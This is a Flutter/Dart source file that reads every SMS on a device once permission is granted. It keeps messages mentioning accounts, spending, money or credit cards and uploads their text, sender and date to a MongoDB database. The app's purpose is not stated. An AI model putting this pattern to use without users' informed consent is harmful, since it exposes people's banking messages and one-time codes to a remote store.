

import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:sms_email_retreiver/database/mongodb.dart';
import 'package:sms_email_retreiver/models/Message.dart';

class SMSBloc{

  SmsQuery query = SmsQuery();
  List<Message> messages = <Message>[];
  List<String> filters = ["account", "spend", "money", "credit card"];

  fetchSMS() async {
    if (await Permission.sms.request().isGranted) {
      List list = await query.getAllSms;
      for (SmsMessage smsMessage in list) {
        if (isAcceptable(smsMessage)) {
          messages.add(Message(smsMessage.body ?? "", smsMessage.sender ?? "",
              smsMessage.dateSent ?? DateTime.now()));
        }
      }
    }
    storeSMS();
  }

  storeSMS() async {
    List<Map<String, dynamic>> list = <Map<String, dynamic>>[];
    for (Message message in messages) {
      list.add(message.toMap());
    }
    await MongoDB.addDocuments(list);
  }

  bool isAcceptable(SmsMessage smsMessage) {
    for (String filter in filters) {
      bool ans = smsMessage.body?.toLowerCase().contains(filter) ?? false;
      if (ans) {
        return true;
      }
    }
    return false;
  }
}